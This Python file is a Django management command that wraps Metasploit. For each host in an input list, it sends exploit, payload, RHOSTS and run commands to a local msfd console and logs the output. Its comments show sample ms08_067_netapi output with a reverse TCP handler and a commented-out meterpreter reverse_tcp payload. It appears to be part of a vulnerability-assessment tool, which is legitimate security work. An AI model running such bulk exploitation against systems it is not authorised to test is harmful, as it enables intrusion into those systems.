#!/usr/bin/python3
from django.core.management.base import BaseCommand, CommandError
from app.models import vdTarget, vdResult, vdServices, vdInServices, vdRegExp, vdJob  
from django.utils import timezone
import re
from cProfile import label
from app.views import autodetectType, delta, debug, PARSER_DEBUG
from app.nmapmodels import NMAP_PORTS, NMHost, NMService
import json
import os
from pymetasploit3.msfrpc import *
from app.metasploitbr import *
import socket
import time
import sys

class Command(BaseCommand):
    help = 'Wrapper for Metasploit'
    def add_arguments(self, parser):
        #This single module reads the input file and converts it
        parser.add_argument('--input', help='The input file for metasploit', default='stdin')
        #parser.add_argument('--host', help='Hostname from Target system')
        parser.add_argument('--msfconfig', help='The Metasploit Json Config (Template)', default='msf.vdoberman')
        parser.add_argument('--output', help='The destination report', default='stdout')
        parser.add_argument('--debug', help='Print verbose data', action='store_true', default=False)

    def read_msf_data(self, MsfFile):
        if os.path.isfile(MsfFile):
            MsfConfig = open(MsfFile,'r')
            json_info = MsfConfig.read()
            config = json.loads(json_info)
            return config
        return False
                    
    def handle(self, *args, **kwargs):
        PARSER_DEBUG = kwargs['debug']
        for item in kwargs:
            debug(item)

        config = self.read_msf_data(kwargs['msfconfig'])
        if not config:
            debug("Fatal Error, msfconfig must be created by WUI\n")
            return False
        #debug(str(config)+"\n")
        HostsFileName = kwargs['input']
        if not os.path.isfile(HostsFileName):
            debug("Fatal error, there is no such input file\n")
            return False
        debug("Process:"+HostsFileName+"\n")
        HostsFile=open(HostsFileName,'r')
        #Output Report
        ReportOut = sys.stdout
        if kwargs['output'] == "stderr":
            ReportOut = sys.stderr
        if kwargs['output'] != "stdout" and kwargs['output'] != "stderr":
            ReportOut = open(kwargs['output'], "a+")
        
        def print_to_report(client, ReportOut):
            try:
                onscreen = client.recv(4096)
                lines = str(onscreen).split("\\n")
                for line in lines:
                    print(escape_ansi(line)+"\n")
                    #print(line+"\n")
                    ReportOut.write(escape_ansi(line)+"\n")
            except Exception as e:
                print("Error on reading\n"+str(e))
        
        #Remove ANSI chars to avoid gibrish on the report
        def escape_ansi(line):
            #\x01\x1b[4m\x02msf6\x01\x1b[0m\x02 exploit(\x01\x1b[1m\x02\x01\x1b[31m\x02windows/smb/ms08_067_netapi\x01\x1b[0m\x02) \x01\x1b[0m\x02> RHOSTS => 192.168.11.128 \x01\x1b[4m\x02msf6\x01\x1b[0m\x02 exploit(\x01\x1b[1m\x02\x01\x1b[31m\x02windows/smb/ms08_067_netapi\x01\x1b[0m\x02) \x01\x1b[0m\x02> \x01\x1b[4m\x02msf6\x01\x1b[0m\x02 exploit(\x01\x1b[1m\x02\x01\x1b[31m\x02windows/smb/ms08_067_netapi\x01\x1b[0m\x02) \x01\x1b[0m\x02> [*] Started reverse TCP handler on 192.168.11.102:4444 
            ansi_escape = re.compile(r'(\\[x,X][a-f,A-F,0-9]{2})*\[[a-f,A-F,0-9]*m\\[x,X,;]02')
            line = ansi_escape.sub('', line)
            return line
        #Due to msf library not working as expected, we have to open a socket and handle msfd instead
        sclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sclient.connect(("127.0.0.1",5554))
        sclient.setblocking(0)
        #Waiting for the console to be ready
        time.sleep(1)
        
        for host in HostsFile:
            debug("Working on Host:"+host)
            host.rstrip("\n")
            #Hardcoded password?, don't worry the server only works on localhost
            client = get_client_object()
            #Not working lines
            #exploit = client.modules.use('exploit', config['exploit'])
            #exploit['RHOSTS'] = host
            #Replacements
            sclient.send(bytes("use "+config['exploit']+"\n",'utf-8'))
            time.sleep(0.1)
            #This hardcoded payload is only for testing
            #exploit.execute(payload="payload/windows/meterpreter/reverse_tcp")
            #The following code also produces no result at all, will be replaced
            #MsfJobId = exploit.execute(payload=config['payload'])
            #if MsfJobId is not None:
            #    debug("MsfJobId:"+str(MsfJobId)+"\n")
            if config['exploit'].startswith('exploit'):
                sclient.send(bytes("set payload "+config['payload']+"\n",'utf-8'))
                time.sleep(0.5)
            sclient.send(bytes("set RHOSTS "+host+"\n",'utf-8'))
            time.sleep(0.1)
            #sclient.send(bytes("exploit\n",'utf-8'))
            sclient.send(bytes("run\n",'utf-8'))
            time.sleep(10)
            sclient.send(bytes("close \n",'utf-8'))
            time.sleep(0.5)
            sclient.send(bytes("sessions -K \n",'utf-8'))
            for i in [1,2,3,4,5]:
                print_to_report(sclient,ReportOut)
        ReportOut.close()
        HostsFile.close()
        sclient.close()
        debug("Done printing")